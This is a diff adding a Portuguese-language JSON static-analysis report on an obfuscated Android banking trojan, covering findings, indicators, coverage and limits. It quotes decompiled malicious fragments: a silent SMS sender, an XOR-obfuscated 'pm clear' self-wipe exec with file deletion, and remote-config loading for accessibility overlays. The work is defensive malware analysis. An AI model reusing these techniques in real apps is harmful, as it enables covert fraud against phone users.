@@ -1,0 +1,417 @@
+{
+  "resumo_funcionamento": "APK bancário/overlay com múltiplos módulos ofuscados: (1) serviço Response que envia SMS silenciosamente via SmsManager a partir de um Intent com scheme decodificado 'smsto'; (2) serviço de acessibilidade kltwlkizuxhgjrcyfiarqyuwjuvz com overlay, screenshot, gestos e exfiltração; (3) classe de configuração lqkgduyoofpqpmpsqmcean com config remota Base64 ('empty|' inicial) que alimenta o conjunto de pacotes-alvo; (4) DownloadForegroundService com HttpURLConnection/URL para download de payload; (5) rotina de autodestruição em cafaiezlhmdcjcdp cujo comando shell decodificado foi agora reproduzido deterministicamente como 'pm clear ' concatenado com o nome do pacote — ou seja, limpeza total dos dados do próprio app (wipe de configuração, banco e traces) via shell. Todas as strings sensíveis são ofuscadas por XOR (ac0.a → f11a.a). Presença no código não comprova execução.",
+  "fluxo_alto_nivel": [
+    "1. Config remota (lqkgduyoofpqpmpsqmcean.ipqzpdjermcdvtbjxigpvizdmyv / ALL_CONFIG) é lida por zfyxetnpqczwwesatwnjdr.onStartCommand, decodificada em Base64 e preenche o conjunto-alvo kltwlkizuxhgjrcyfiarqyuwjuvz.x (pacotes overlay).",
+    "2. Serviço de acessibilidade monitora janela ativa, aplica overlays WebView sobre pacotes em x, captura screenshots (Base64/WEBP) e envia JSON via d0/wy.",
+    "3. Serviço Response recebe Intent com URI scheme 'smsto' e extra 'android.intent.extra.TEXT' e envia SMS silencioso via SmsManager.getDefault().sendTextMessage, parando a si (stopSelf, return 2).",
+    "4. r0 consulta ContactsContract/URIs de SMS decodificadas em runtime para dump de contatos/mensagens (corpo truncado).",
+    "5. DownloadForegroundService usa HttpURLConnection/URL com strings decodificadas, incluindo 'Searching for updates' (texto disfarçado de atualização), para baixar payload.",
+    "6. Activity cafaiezlhmdcjcdp.e executa Runtime.getRuntime().exec('pm clear ' + packageName), apaga recursivamente arquivos/bancos e chama System.exit(1) — autodestruição por limpeza de dados."
+  ],
+  "achados": [
+    {
+      "id": "A001",
+      "pista_ids": [
+        "P001"
+      ],
+      "funcionamento": "Serviço Response: onStartCommand chama a(intent), que valida o scheme da URI do Intent contra string decodificada por XOR ('smsto'), extrai schemeSpecificPart como número e o extra 'android.intent.extra.TEXT' como corpo, e envia SMS silencioso (sem PendingIntent). Depois stopSelf e return 2 (START_NOT_STICKY). Fluxo reconstruído estáticamente; gatilho externo não confirmado (manifesto indisponível).",
+      "classificacao": "sustentado_no_codigo",
+      "confianca": "alta",
+      "evidencias": [
+        {
+          "registro_fonte": "M0006",
+          "classe": "verifier.harmonizer.provider.Response",
+          "metodo": "a",
+          "trecho": "SmsManager.getDefault().sendTextMessage(schemeSpecificPart, null, stringExtra, null, null);"
+        },
+        {
+          "registro_fonte": "M0006",
+          "classe": "verifier.harmonizer.provider.Response",
+          "metodo": "onStartCommand",
+          "trecho": "a(intent); stopSelf(i2); return 2;"
+        },
+        {
+          "registro_fonte": "M0006",
+          "classe": "verifier.harmonizer.provider.Response",
+          "metodo": "a",
+          "trecho": "Uri data = intent.getData(); String schemeSpecificPart = (data == null || !ac0.a(new byte[]{80, -115, -75, -17, 25}, new byte[]{35, -32, -58, -101, 118, 98, 2, 2}).equals(data.getScheme())) ? null : data.getSchemeSpecificPart();"
+        }
+      ],
+      "lacunas": [
+        "AndroidManifest.xml indisponível (M0002): gatilho/intent-filter do serviço não confirmado."
+      ]
+    },
+    {
+      "id": "A003",
+      "pista_ids": [
+        "P005"
+      ],
+      "funcionamento": "Segundo uso de SmsManager na classe r0: importa SmsManager, SubscriptionManager e ContactsContract e executa query ao ContentResolver sobre ContactsContract.CommonDataKinds.Phone.CONTENT_URI, consistente com dump de contatos/SMS. Corpo do método truncado em M0029; uso integral de SmsManager em r0 não visível.",
+      "classificacao": "sustentado_no_codigo",
+      "confianca": "media",
+      "evidencias": [
+        {
+          "registro_fonte": "M0005",
+          "classe": "-",
+          "metodo": "-",
+          "trecho": "items: [\"verifier.harmonizer.provider.Response\", \"verifier.harmonizer.provider.r0\"]"
+        },
+        {
+          "registro_fonte": "M0029",
+          "classe": "verifier.harmonizer.provider.r0",
+          "metodo": "a",
+          "trecho": "import android.telephony.SmsManager;"
+        },
+        {
+          "registro_fonte": "M0029",
+          "classe": "verifier.harmonizer.provider.r0",
+          "metodo": "a",
+          "trecho": "Query = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new"
+        }
+      ],
+      "lacunas": [
+        "M0029 truncado: final do método a() e envio/exfiltração do dump não vistos."
+      ]
+    },
+    {
+      "id": "A004",
+      "pista_ids": [
+        "P006"
+      ],
+      "funcionamento": "Canal de configuração remota: zfyxetnpqczwwesatwnjdr.onStartCommand valida lqkgduyoofpqpmpsqmcean.ipqzpdjermcdvtbjxigpvizdmyv (inicial 'empty|'), decodifica entradas Base64 separadas por delimitador decodificado, popula kltwlkizuxhgjrcyfiarqyuwjuvz.x (pacotes-alvo overlay, em minúsculas) e configura módulos; inicia serviço foreground kiezkyvaplpxfgcszohglq via startForegroundService. Se a config começa com valor decodificado de 'empty|'-like ou igual ao primeiro item, desativa via wy.f(..., false).",
+      "classificacao": "sustentado_no_codigo",
+      "confianca": "alta",
+      "evidencias": [
+        {
+          "registro_fonte": "M0024",
+          "classe": "verifier.harmonizer.provider.zfyxetnpqczwwesatwnjdr",
+          "metodo": "onStartCommand",
+          "trecho": "if (!lqkgduyoofpqpmpsqmcean.ipqzpdjermcdvtbjxigpvizdmyv.contains(ac0.a(new byte[]{64}, new byte[]{60, -62, 14, 96, -109, -109, -73, -65})) || lqkgduyoofpqpmpsqmcean.ipqzpdjermcdvtbjxigpvizdmyv.startsWith(ac0.a(new byte[]{-48, -80, -115, -76, -102, -36}, new byte[]{-75, -35, -3, -64, -29, -96, 103, 8}))) {"
+        },
+        {
+          "registro_fonte": "M0024",
+          "classe": "verifier.harmonizer.provider.zfyxetnpqczwwesatwnjdr",
+          "metodo": "onStartCommand",
+          "trecho": "String str2 = new String(Base64.decode(str, 0), ac0.a(new byte[]{-11, -119, 100, -61, -97}, new byte[]{-96, -35, 34, -18, -89, -90, -7, 46}));"
+        },
+        {
+          "registro_fonte": "M0024",
+          "classe": "verifier.harmonizer.provider.zfyxetnpqczwwesatwnjdr",
+          "metodo": "onStartCommand",
+          "trecho": "kltwlkizuxhgjrcyfiarqyuwjuvz.x.add(str5.toLowerCase());"
+        },
+        {
+          "registro_fonte": "M0024",
+          "classe": "verifier.harmonizer.provider.zfyxetnpqczwwesatwnjdr",
+          "metodo": "onStartCommand",
+          "trecho": "startForegroundService(intent2);"
+        }
+      ],
+      "lacunas": [
+        "Origem da atualização de ipqzpdjermcdvtbjxigpvizdmyv/ALL_CONFIG (rede/C2) não mapeada."
+      ]
+    },
+    {
+      "id": "A005",
+      "pista_ids": [
+        "P007"
+      ],
+      "funcionamento": "Classe de configuração central lqkgduyoofpqpmpsqmcean: campos indicativos (_Login_title_, _Login_btn_, Anti_Delete, ALL_CONFIG, Prevent_sleep, SetDef_SMS, SetDef_Call, extjs, PPKG, subdir) e ipqzpdjermcdvtbjxigpvizdmyv = \"empty|\" como estado inicial (módulos desativados até config remota). _Login_title_ = 'U2VydmnDp28gZGUgQWNlc3NpYmlsaWRhZGU=' (Base64 de texto em português sobre acessibilidade), indicando phishing de permissão de acessibilidade em pt-BR.",
+      "classificacao": "sustentado_no_codigo",
+      "confianca": "alta",
+      "evidencias": [
+        {
+          "registro_fonte": "M0025",
+          "classe": "verifier.harmonizer.provider.lqkgduyoofpqpmpsqmcean",
+          "metodo": "<fields>",
+          "trecho": "AccessInfo: FIELD 0x9 (public static ) java.lang.String Anti_Delete"
+        },
+        {
+          "registro_fonte": "M0025",
+          "classe": "verifier.harmonizer.provider.lqkgduyoofpqpmpsqmcean",
+          "metodo": "<fields>",
+          "trecho": "AccessInfo: FIELD 0x9 (public static ) java.lang.String SetDef_SMS"
+        },
+        {
+          "registro_fonte": "M0028",
+          "classe": "verifier.harmonizer.provider.lqkgduyoofpqpmpsqmcean",
+          "metodo": "<clinit>",
+          "trecho": "public static String ipqzpdjermcdvtbjxigpvizdmyv = \"empty|\";"
+        },
+        {
+          "registro_fonte": "M0028",
+          "classe": "verifier.harmonizer.provider.lqkgduyoofpqpmpsqmcean",
+          "metodo": "<clinit>",
+          "trecho": "public static String _Login_title_ = \"U2VydmnDp28gZGUgQWNlc3NpYmlsaWRhZGU=\";"
+        }
+      ],
+      "lacunas": [
+        "Valores finais dos campos de config dependem da atualização remota, não observável estaticamente."
+      ]
+    },
+    {
+      "id": "A007",
+      "pista_ids": [
+        "P010"
+      ],
+      "funcionamento": "Ofuscação estrutural: nomes de classes/campos artificialmente aleatórios (kltwlkizuxhgjrcyfiarqyuwjuvz, lqkgduyoofpqpmpsqmcean, rddzaiebmeaottxhlopuliu), pacote de decodificação profundo (a.b.c.d...bababa) com classes curtas (ac0, bc0, wy, qe, ce), strings XOR em <clinit> (inclusive no AsyncTask kiezkyvaplpxfgcszohglq$d via smali).",
+      "classificacao": "sustentado_no_codigo",
+      "confianca": "alta",
+      "evidencias": [
+        {
+          "registro_fonte": "M0038",
+          "classe": "verifier.harmonizer.provider.o0",
+          "metodo": "<imports>",
+          "trecho": "import a.b.c.d.e.f.g.h.i.j.k.l.m.o.p.aa.aaa.aaaa.aaab.aabb.aabbaa.ababaa.bababa.ac0;"
+        },
+        {
+          "registro_fonte": "M0028",
+          "classe": "verifier.harmonizer.provider.lqkgduyoofpqpmpsqmcean",
+          "metodo": "<clinit>",
+          "trecho": "public static String rddzaiebmeaottxhlopuliu = get_dropname();"
+        },
+        {
+          "registro_fonte": "M0036",
+          "classe": "verifier.harmonizer.provider.kiezkyvaplpxfgcszohglq.d",
+          "metodo": "<clinit>",
+          "trecho": ".class public Lverifier/harmonizer/provider/kiezkyvaplpxfgcszohglq$d;\n.super Landroid/os/AsyncTask;"
+        }
+      ],
+      "lacunas": []
+    },
+    {
+      "id": "A008",
+      "pista_ids": [
+        "P011"
+      ],
+      "funcionamento": "Autodestruição confirmada com decodificação: cafaiezlhmdcjcdp.e executa Runtime.getRuntime().exec(comando_decodificado + packageName); a transformação XOR determinística (T0007) reproduz o comando decodificado como 'pm clear ', resultando em 'pm clear <pacote>' — limpeza total dos dados do próprio app via shell (apaga config, bancos e artefatos). Em seguida apaga recursivamente filesDir e chama System.exit(1). O método b alterna flags do serviço de acessibilidade (kltwlkizuxhgjrcyfiarqyuwjuvz.b0).",
+      "classificacao": "sustentado_no_codigo",
+      "confianca": "alta",
+      "evidencias": [
+        {
+          "registro_fonte": "M0042",
+          "classe": "verifier.harmonizer.provider.cafaiezlhmdcjcdp",
+          "metodo": "e",
+          "trecho": "Runtime.getRuntime().exec(ac0.a(new byte[]{-3, 105, 2, 102, 116, 114, 102, 122, -83}, new byte[]{-115, 4, 34, 5, 24, 23, 7, 8}) + getApplicationContext().getPackageName());"
+        },
+        {
+          "registro_fonte": "T0007",
+          "classe": "-",
+          "metodo": "-",
+          "trecho": "{\"saida_hex\": \"706d20636c65617220\", \"saida_utf8\": \"pm clear \", \"passos\": [{\"op\": \"xor\", \"saida_hex\": \"706d20636c65617220\"}]}"
+        },
+        {
+          "registro_fonte": "M0042",
+          "classe": "verifier.harmonizer.provider.cafaiezlhmdcjcdp",
+          "metodo": "e",
+          "trecho": "c(applicationContext.getFilesDir());"
+        },
+        {
+          "registro_fonte": "M0042",
+          "classe": "verifier.harmonizer.provider.cafaiezlhmdcjcdp",
+          "metodo": "e",
+          "trecho": "System.exit(1);"
+        },
+        {
+          "registro_fonte": "M0042",
+          "classe": "verifier.harmonizer.provider.cafaiezlhmdcjcdp",
+          "metodo": "b",
+          "trecho": "kltwlkizuxhgjrcyfiarqyuwjuvz.b0 = z;"
+        }
+      ],
+      "lacunas": [
+        "Gatilho que invoca cafaiezlhmdcjcdp.e (quando a autodestruição é disparada) não determinado; manifesto indisponível.",
+        "Nem toda string da activity (demais mensagens/flags) foi decodificada — limite de receitas atingido."
+      ]
+    }
+  ],
+  "iocs": [
+    {
+      "id": "I001",
+      "tipo": "comando_shell",
+      "valor_original": "pm clear ",
+      "valor_normalizado": "pm clear <packageName>",
+      "papel": "autodestruição: limpeza dos dados do próprio app concatenado com getPackageName() em Runtime.exec",
+      "estado": "sustentado_no_codigo",
+      "confianca": "alta",
+      "achado_ids": [
+        "A008"
+      ],
+      "evidencias": [
+        {
+          "registro_fonte": "M0042",
+          "classe": "verifier.harmonizer.provider.cafaiezlhmdcjcdp",
+          "metodo": "e",
+          "trecho": "Runtime.getRuntime().exec(ac0.a(new byte[]{-3, 105, 2, 102, 116, 114, 102, 122, -83}, new byte[]{-115, 4, 34, 5, 24, 23, 7, 8}) + getApplicationContext().getPackageName());"
+        },
+        {
+          "registro_fonte": "T0007",
+          "classe": "-",
+          "metodo": "-",
+          "trecho": "{\"saida_hex\": \"706d20636c65617220\", \"saida_utf8\": \"pm clear \", \"passos\": [{\"op\": \"xor\", \"saida_hex\": \"706d20636c65617220\"}]}"
+        }
+      ]
+    },
+    {
+      "id": "I003",
+      "tipo": "classe_maliciosa",
+      "valor_original": "verifier.harmonizer.provider.Response",
+      "valor_normalizado": "verifier.harmonizer.provider.Response",
+      "papel": "serviço de envio silencioso de SMS via SmsManager",
+      "estado": "sustentado_no_codigo",
+      "confianca": "alta",
+      "achado_ids": [
+        "A001"
+      ],
+      "evidencias": [
+        {
+          "registro_fonte": "M0006",
+          "classe": "verifier.harmonizer.provider.Response",
+          "metodo": "a",
+          "trecho": "SmsManager.getDefault().sendTextMessage(schemeSpecificPart, null, stringExtra, null, null);"
+        }
+      ]
+    },
+    {
+      "id": "I004",
+      "tipo": "classe_maliciosa",
+      "valor_original": "verifier.harmonizer.provider.kltwlkizuxhgjrcyfiarqyuwjuvz",
+      "valor_normalizado": "verifier.harmonizer.provider.kltwlkizuxhgjrcyfiarqyuwjuvz (AccessibilityService)",
+      "papel": "serviço de acessibilidade: overlay, screenshot, gestos/cliques e exfiltração de UI; conjunto-alvo x alimentado pela config remota",
+      "estado": "sustentado_no_codigo",
+      "confianca": "media",
+      "achado_ids": [
+        "A004",
+        "A007"
+      ],
+      "evidencias": [
+        {
+          "registro_fonte": "M0024",
+          "classe": "verifier.harmonizer.provider.zfyxetnpqczwwesatwnjdr",
+          "metodo": "onStartCommand",
+          "trecho": "kltwlkizuxhgjrcyfiarqyuwjuvz.x.add(str5.toLowerCase());"
+        }
+      ]
+    },
+    {
+      "id": "I005",
+      "tipo": "classe_maliciosa",
+      "valor_original": "verifier.harmonizer.provider.cafaiezlhmdcjcdp",
+      "valor_normalizado": "verifier.harmonizer.provider.cafaiezlhmdcjcdp",
+      "papel": "activity de autodestruição: 'pm clear' via shell, deleção recursiva de arquivos e System.exit(1)",
+      "estado": "sustentado_no_codigo",
+      "confianca": "alta",
+      "achado_ids": [
+        "A008"
+      ],
+      "evidencias": [
+        {
+          "registro_fonte": "M0042",
+          "classe": "verifier.harmonizer.provider.cafaiezlhmdcjcdp",
+          "metodo": "e",
+          "trecho": "System.exit(1);"
+        }
+      ]
+    },
+    {
+      "id": "I006",
+      "tipo": "config_base64",
+      "valor_original": "U2VydmnDp28gZGUgQWNlc3NpYmlsaWRhZGU=",
+      "valor_normalizado": "U2VydmnDp28gZGUgQWNlc3NpYmlsaWRhZGU= (campo _Login_title_, Base64; decodifica para texto em português sobre 'Serviço de Acessibilidade')",
+      "papel": "título de tela de phishing de habilitação de acessibilidade (pt-BR)",
+      "estado": "sustentado_no_codigo",
+      "confianca": "alta",
+      "achado_ids": [
+        "A005"
+      ],
+      "evidencias": [
+        {
+          "registro_fonte": "M0028",
+          "classe": "verifier.harmonizer.provider.lqkgduyoofpqpmpsqmcean",
+          "metodo": "<clinit>",
+          "trecho": "public static String _Login_title_ = \"U2VydmnDp28gZGUgQWNlc3NpYmlsaWRhZGU=\";"
+        }
+      ]
+    },
+    {
+      "id": "I007",
+      "tipo": "chave_config_inicial",
+      "valor_original": "empty|",
+      "valor_normalizado": "empty|",
+      "papel": "valor inicial de ipqzpdjermcdvtbjxigpvizdmyv — config vazia, módulos desativados até recebimento remoto",
+      "estado": "sustentado_no_codigo",
+      "confianca": "alta",
+      "achado_ids": [
+        "A004",
+        "A005"
+      ],
+      "evidencias": [
+        {
+          "registro_fonte": "M0028",
+          "classe": "verifier.harmonizer.provider.lqkgduyoofpqpmpsqmcean",
+          "metodo": "<clinit>",
+          "trecho": "public static String ipqzpdjermcdvtbjxigpvizdmyv = \"empty|\";"
+        }
+      ]
+    }
+  ],
+  "cobertura": [
+    {
+      "area": "servico_sms_Response",
+      "estado": "examinada",
+      "justificativa": "Fonte completa em M0006; fluxo onStartCommand → a() → SmsManager → stopSelf reconstruído."
+    },
+    {
+      "area": "ofuscacao_ac0_xor",
+      "estado": "examinada",
+      "justificativa": "Algoritmo XOR validado por transformações determinísticas T0007 ('pm clear ') e T0008 ('Searching for updates'); delegação ac0→f11a em M0010. Corpo de f11a não obtido (M0043/M0044, 404)."
+    },
+    {
+      "area": "autodestruicao_cafaiezlhmdcjcdp",
+      "estado": "examinada",
+      "justificativa": "Comando shell decodificado ('pm clear '), deleção de filesDir e System.exit(1) confirmados (M0042 + T0007); gatilho de invocação ainda não mapeado."
+    },
+    {
+      "area": "configuracao_remota_e_C2",
+      "estado": "parcial",
+      "justificativa": "Parsing Base64, campos e consumidores de ALL_CONFIG/ipqzpdjermcdvtbjxigpvizdmyv confirmados; fonte de atualização (rede) não seguida até o fim."
+    },
+    {
+      "area": "servico_acessibilidade_kltwlkizuxhgjrcyfiarqyuwjuvz",
+      "estado": "parcial",
+      "justificativa": "Capacidades gerais (overlay, screenshot, gestos, exfiltração) confirmadas em rodadas anteriores; retornos truncados (M0012/M0017) impediram leitura integral."
+    },
+    {
+      "area": "classe_r0_dump_sms_contatos",
+      "estado": "parcial",
+      "justificativa": "Imports e query a ContactsContract confirmados (M0029); método truncado."
+    },
+    {
+      "area": "rede_e_exfiltracao",
+      "estado": "parcial",
+      "justificativa": "DownloadForegroundService com HttpURLConnection/URL e string de disfarce decodificada; URLs/domínios reais não extraídos; d0/o0 apenas candidatos."
+    },
+    {
+      "area": "manifest_e_entry_points",
+      "estado": "nao_examinada",
+      "justificativa": "AndroidManifest.xml indisponível (M0002 erro 404); entry points, permissões e intents-filters não confirmados."
+    },
+    {
+      "area": "carregamento_dinamico_e_reflexao",
+      "estado": "nao_examinada",
+      "justificativa": "M0008 sem itens para DexClassLoader; reflexão/loadLibrary não pesquisados."
+    }
+  ],
+  "limites": [
+    "Análise puramente estática via JADX: presença no código não comprova execução, atividade de rede nem autoria.",
+    "AndroidManifest.xml indisponível (M0002, erro 404): gatilhos, permissões e intent-filters não confirmados.",
+    "M0043/M0044 falharam (404): classe f11a (implementação do XOR) não localizada pelo índice; o algoritmo foi validado indiretamente pelas transformações T0007/T0008.",
+    "A ferramenta de transformações atingiu o limite de 8 receitas: a maioria das strings ofuscadas (scheme 'smsto', extras, URL de download, listas-alvo, demais mensagens) permanece não decodificada nesta rodada.",
+    "A correspondência byte-a-byte entre o array de DownloadForegroundService.<clinit> (M0039) e T0008 não foi revalidada (falha de receita por limite); associação registrada como candidato.",
+    "Retornos truncados (M0012, M0016, M0017, M0020, M0029, M0033, M0036, M0038, M0039) deixaram partes relevantes não examinadas.",
+    "M0032 vazio e M0034 sem corpo: lógica interna do AsyncTask kiezkyvaplpxfgcszohglq.d não lida.",
+    "Nenhum domínio C2 ou URL literal foi extraído; a busca por 'https://' retornou vazia (M0021), o que não descarta comunicação C2.",
+    "Pista P002 sem achado com evidência conferida; permanece pendente.",
+    "Pista P009 sem achado com evidência conferida; permanece pendente."
+  ]
+}
